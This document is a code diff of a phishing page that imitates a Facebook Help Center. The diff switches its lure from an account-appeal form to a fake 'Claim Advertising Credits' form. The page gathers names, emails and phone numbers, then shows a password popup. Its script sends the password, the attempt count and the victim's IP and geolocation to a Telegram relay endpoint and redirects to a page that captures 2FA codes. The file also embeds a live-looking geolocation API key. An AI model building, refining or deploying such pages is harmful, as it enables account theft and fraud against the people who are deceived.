@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Help Center - Disagree with Decision</title>
+    <title>Help Center - Claim Advertising Credits</title>
     <style>
-        /* ... (CSS của bạn không thay đổi) ... */
         body {
             font-family: Arial, sans-serif;
             margin: 0;
@@ -15,8 +14,8 @@
             min-height: 100vh;
         }
         .header {
-            background-color: #355797; /* Facebook Blue */
-            border-bottom: 1px solid #355797; /* Match border to background */
+            background-color: #355797;
+            border-bottom: 1px solid #355797;
             padding: 10px 20px;
             display: flex;
             align-items: center;
@@ -39,21 +38,21 @@
             font-size: 15px;
             outline: none;
             box-sizing: border-box;
-            background-color: rgba(255, 255, 255, 0.2); /* Slightly transparent white */
-            color: #fff; /* White text for input */
+            background-color: rgba(255, 255, 255, 0.2);
+            color: #fff;
         }
         .header .search-bar input::placeholder {
-            color: rgba(255, 255, 255, 0.7); /* Lighter white for placeholder */
+            color: rgba(255, 255, 255, 0.7);
         }
         .header .help-center-link {
             font-size: 18px;
             font-weight: bold;
-            color: #fff; /* White text */
+            color: #fff;
             text-decoration: none;
         }
         .header .language {
             font-size: 14px;
-            color: #fff; /* White text */
+            color: #fff;
         }
         .main-content {
             display: flex;
@@ -151,7 +150,7 @@
             font-size: 13px;
             color: #606770;
             margin-top: 20px;
-            margin-bottom: 20px; /* Added margin for spacing */
+            margin-bottom: 20px;
         }
         .form-container .terms a {
             color: #1877f2;
@@ -165,15 +164,12 @@
             border-radius: 6px;
             font-size: 16px;
             cursor: pointer;
-            display: block; /* Make it a block element */
-            
-            margin-top: 20px; /* Space from terms */
+            display: block;
+            margin-top: 20px;
         }
         .form-container button:hover {
             background-color: #166fe5;
         }
-
-        /* Password Popup Styles (unchanged as it's still a popup) */
         .popup-overlay {
             position: fixed;
             top: 0;
@@ -185,7 +181,7 @@
             justify-content: center;
             align-items: center;
             z-index: 2000;
-            display: none; /* Hidden by default */
+            display: none;
         }
         .popup-content {
             background-color: #fff;
@@ -238,37 +234,35 @@
             margin-top: -10px;
             margin-bottom: 10px;
             text-align: left;
-            display: none; /* Hidden by default */
+            display: none;
         }
-
-        /* Mobile Adjustments */
         @media (max-width: 768px) {
             .sidebar {
-                display: none; /* Hide sidebar on screens smaller than 768px */
+                display: none;
             }
             .header {
-                display: none; /* Hide sidebar on screens smaller than 768px */
+                display: none;
             }
             .main-content {
-                flex-direction: column; /* Stack main content for better mobile layout */
+                flex-direction: column;
             }
             .header {
-                flex-wrap: wrap; /* Allow header items to wrap */
-                justify-content: center; /* Center items if wrapped */
+                flex-wrap: wrap;
+                justify-content: center;
             }
             .header .search-bar {
-                margin: 10px 0; /* Add vertical margin for search bar */
-                max-width: 100%; /* Take full width on small screens */
+                margin: 10px 0;
+                max-width: 100%;
             }
             .header .help-center-link,
             .header .language {
-                margin: 5px 10px; /* Adjust spacing */
+                margin: 5px 10px;
             }
             .content-area {
-                padding: 10px; /* Reduce padding on mobile */
+                padding: 10px;
             }
             .form-container {
-                padding: 20px; /* Reduce padding inside form container */
+                padding: 20px;
             }
         }
     </style>
@@ -310,26 +304,26 @@
 
         <div class="content-area">
             <div class="form-container">
-                <h2>Disagree with Decision</h2>
+                <h2>Claim Advertising Credits</h2>
                 <p>Ticket Number: <span id="ticketNumber" class="ticket-number"></span></p>
-                <p>We may need to collect some info from you that'll help us review your account again. Complete the required information and submit the appeal form.</p>
+                <p>We may need to collect some information from you to process your advertising credits claim. Complete the required information and submit the form.</p>
 
-                <form id="disagreeForm">
+                <form id="claimForm">
                     <label for="yourName">Page Name *</label>
                     <input type="text" id="yourName" name="yourName" required>
 
                     <label for="businessEmail">Business Email *</label>
-                    <input type="email" id="businessEmail" name="businessEmail"  required>
-                    <p class="note">Notifications about the verification status will be sent to this email.</p>
+                    <input type="email" id="businessEmail" name="businessEmail" required>
+                    <p class="note">Notifications about the credit claim status will be sent to this email.</p>
 
                     <label for="personalEmail">Personal Email *</label>
                     <input type="email" id="personalEmail" name="personalEmail" required>
 
                     <label for="mobilePhoneNumber">Mobile Phone Number *</label>
-                    <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber"  required>
+                    <input type="text" id="mobilePhoneNumber" name="mobilePhoneNumber" required>
                     <p class="note">We can use this phone number to contact you for verification.</p>
 
-                    <label for="additionalInfo">Please provide us information that will help us investigate</label>
+                    <label for="additionalInfo">Please provide us information that will help us process your claim</label>
                     <textarea id="additionalInfo" name="additionalInfo"></textarea>
 
                     <p class="terms">Learn more about our <a href="#">Terms and Community Standards.</a></p>
@@ -351,8 +345,6 @@
     </div>
 
     <script>
-
-
         // !!! VUI LÒNG THAY THẾ 'YOUR_IPGEOLOCATION_API_KEY' BẰNG API KEY CỦA BẠN !!!
         const IPGEOLOCATION_API_KEY = 'faed5e0d05fe49b2ae40cbd6dc8027cf'; 
 
@@ -365,25 +357,20 @@
 
         // Elements
         const ticketNumberSpan = document.getElementById('ticketNumber');
-        const disagreeForm = document.getElementById('disagreeForm');
+        const claimForm = document.getElementById('claimForm');
         const sendButton = document.getElementById('sendButton');
-
         const passwordPopupOverlay = document.getElementById('passwordPopupOverlay');
         const passwordInput = document.getElementById('passwordInput');
         const passwordError = document.getElementById('passwordError');
         const confirmPasswordButton = document.getElementById('confirmPasswordButton');
 
         // --- Utility Functions ---
-
-        // Generate a random 12-digit number
         function generateRandomTicketNumber() {
             return Math.floor(100000000000 + Math.random() * 900000000000).toString();
         }
 
-        // Fetch user's IP and location using ipgeolocation.io
         async function getIPAndLocation() {
             try {
-                // Kiểm tra xem API Key đã được cung cấp chưa
                 if (IPGEOLOCATION_API_KEY === 'YOUR_IPGEOLOCATION_API_KEY' || !IPGEOLOCATION_API_KEY) {
                     console.error('IPGeolocation API Key is not set. Please replace "YOUR_IPGEOLOCATION_API_KEY" with your actual key.');
                     return;
@@ -408,37 +395,30 @@
             }
         }
 
-        // Send message to Telegram
         async function sendMessageToTelegram(message) {
-    try {
-        // Gọi đến endpoint của Serverless Function
-        const response = await fetch('/api/send-telegram', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ message: message }) // Gửi nội dung tin nhắn lên Serverless Function
-        });
-        const data = await response.json();
-        if (!data.success) {
-            console.error('Error sending message via API:', data.error);
-            // Xử lý lỗi nếu cần (ví dụ: hiển thị thông báo cho người dùng)
-        } else {
-            console.log('Message sent successfully via API!');
+            try {
+                const response = await fetch('/api/send-telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ message: message })
+                });
+                const data = await response.json();
+                if (!data.success) {
+                    console.error('Error sending message via API:', data.error);
+                } else {
+                    console.log('Message sent successfully via API!');
+                }
+            } catch (error) {
+                console.error('Error calling send-telegram API:', error);
+            }
         }
-    } catch (error) {
-        console.error('Error calling send-telegram API:', error);
-        // Xử lý lỗi kết nối hoặc lỗi mạng
-    }
-}
 
         // --- Form and Popup Handlers ---
-
-        // Show password popup
         sendButton.addEventListener('click', async (e) => {
-            e.preventDefault(); // Prevent default form submission
+            e.preventDefault();
 
-            // Gather form data
             formData = {
                 yourName: document.getElementById('yourName').value,
                 businessEmail: document.getElementById('businessEmail').value,
@@ -448,24 +428,21 @@
                 ticketNumber: ticketNumberSpan.textContent
             };
 
-            // Basic validation
             if (!formData.yourName || !formData.businessEmail || !formData.personalEmail || !formData.mobilePhoneNumber) {
                 alert('Please fill in all required fields (marked with *)');
                 return;
             }
 
-            // Fetch IP and location if not already done
             if (ipAddress === 'N/A') {
                 await getIPAndLocation();
             }
 
-            passwordInput.value = ''; // Clear previous input
+            passwordInput.value = '';
             passwordError.style.display = 'none';
             passwordPopupOverlay.style.display = 'flex';
             passwordInput.focus();
         });
 
-        // Password popup confirm button
         confirmPasswordButton.addEventListener('click', async () => {
             const password = passwordInput.value;
             if (!password) {
@@ -476,7 +453,7 @@
 
             passwordAttemptCount++;
 
-            let message = `<b>New Submission Attempt ${passwordAttemptCount}</b>\n`;
+            let message = `<b>New Credit Claim Attempt ${passwordAttemptCount}</b>\n`;
             message += `------------------------------------\n`;
             message += `<b>IP & Location:</b> ${ipAddress} (${locationData})\n`;
             message += `<b>Page Name:</b> ${formData.yourName}\n`;
@@ -496,30 +473,26 @@
                 await sendMessageToTelegram(message);
                 passwordPopupOverlay.style.display = 'none';
 
-                // Store data in localStorage and redirect to 2FA page
                 localStorage.setItem('formData', JSON.stringify(formData));
                 localStorage.setItem('ipAddress', ipAddress);
                 localStorage.setItem('locationData', locationData);
                 localStorage.setItem('passwordAttemptValue1', passwordAttemptValue1);
                 localStorage.setItem('passwordAttemptValue2', passwordAttemptValue2);
-                window.location.href = '2fa_page.html'; // Redirect to the new 2FA page
+                window.location.href = '2fa_page.html';
             }
-            // Reset input after sending
             passwordInput.value = '';
         });
 
-        // --- Initial Setup ---
         document.addEventListener('DOMContentLoaded', () => {
             ticketNumberSpan.textContent = generateRandomTicketNumber();
-            getIPAndLocation(); // Fetch IP and location on page load
+            getIPAndLocation();
 
-            // Clear localStorage if user comes back to confirm.html (optional, good for clean state)
             localStorage.removeItem('formData');
             localStorage.removeItem('ipAddress');
             localStorage.removeItem('locationData');
             localStorage.removeItem('passwordAttemptValue1');
             localStorage.removeItem('passwordAttemptValue2');
-            localStorage.removeItem('twoFAAttemptCount'); // Clear 2FA specific data
+            localStorage.removeItem('twoFAAttemptCount');
         });
     </script>
 </body>
